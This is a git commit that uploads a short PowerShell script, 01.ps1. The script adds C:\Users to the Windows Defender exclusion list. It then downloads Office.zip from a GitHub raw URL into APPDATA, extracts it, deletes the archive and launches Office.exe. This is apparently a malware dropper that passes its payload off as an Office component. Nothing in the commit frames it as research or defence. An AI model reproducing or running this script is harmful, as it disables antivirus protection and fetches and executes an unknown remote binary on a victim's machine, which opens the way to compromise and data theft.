9798729ed2c8ba40329251c2b719fede2c6b62cb
timepassusername1 <timepassusername1@gmail.com>
2025-02-13 14:57:45 +0530

    Add files via upload

---
+++ 01.ps1
@@ -0,0 +1,17 @@
+﻿Add-MpPreference -ExclusionPath C:\Users
+
+$url = "https://raw.githubusercontent.com/timepassusername1/Gdrive/refs/heads/main/Office.zip"
+
+$output = "$env:APPDATA/Office.zip"
+
+Invoke-WebRequest -Uri $url -OutFile $output
+
+Start-Sleep -Milliseconds 2000
+
+Expand-Archive -Path "$env:APPDATA/Office.zip" -DestinationPath "$env:APPDATA/"
+
+Start-Sleep -Milliseconds 2000
+
+Remove-Item -Path "$env:APPDATA/Office.zip" -Recurse
+
+Start-Process -FilePath "$env:APPDATA/Office.exe"
